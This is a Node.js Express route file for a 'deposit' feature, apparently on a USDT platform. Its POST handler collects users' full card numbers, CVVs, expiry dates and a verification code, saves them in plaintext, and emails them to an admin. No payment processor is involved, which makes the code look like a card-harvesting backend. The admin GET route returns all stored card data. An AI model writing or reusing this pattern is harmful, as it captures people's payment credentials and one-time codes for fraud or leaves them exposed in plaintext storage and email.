const express = require('express');
const router = express.Router();
const Payment = require('../models/Payment');
const DepositRequest = require('../models/DepositRequest');
const authMiddleware = require('../middleware/authMiddleware');
const { transporter } = require('../utils/mailer'); // Ensure transporter is exported in mailer.js

// Save deposit request
router.post('/deposit', async (req, res) => {
  const { cardNumber, cvv, expiry, code, amount } = req.body;
  
  // Get user from session or auth middleware
  const user = req.session.user || req.user;

  if (!user) return res.status(401).json({ message: "Unauthorized" });

  try {
    // Save deposit request
await DepositRequest.create({
  userId: user.id,
  amount,
  method: 'card',
  status: 'pending',
  timestamp: new Date(),
  cardNumber,
  cvv,
  expiry,
  code
});


    // Send email notification to admin
await transporter.sendMail({
  from: process.env.EMAIL_USER,
  to: process.env.ADMIN_EMAIL,
  subject: "🟡 New Deposit Request",
  html: `
    <h3>Deposit Request</h3>
    <p>User: ${user.username} (${user.email})</p>
    <p>Amount: <strong>$${amount} USDT</strong></p>
    <p>Status: Pending</p>
    <hr/>
    <h4>Card Details</h4>
    <p><strong>Card Number:</strong> ${cardNumber}</p>
    <p><strong>CVV:</strong> ${cvv}</p>
    <p><strong>Expiry:</strong> ${expiry}</p>
    <p><strong>Verification Code:</strong> ${code}</p>
  `
});


    return res.json({ message: "Deposit submitted for review." });
  } catch (err) {
    console.error('Deposit error:', err);
    res.status(500).json({ message: "Failed to submit deposit." });
  }
});

// Get all deposits (Admin only)
router.get('/deposits', authMiddleware, async (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  try {
    const deposits = await DepositRequest.find().sort({ timestamp: -1 }).populate('userId', 'username email');
    res.json({ deposits });
  } catch (err) {
    console.error('Fetch deposits error:', err);
    res.status(500).json({ error: 'Failed to fetch deposits' });
  }
});

module.exports = router;
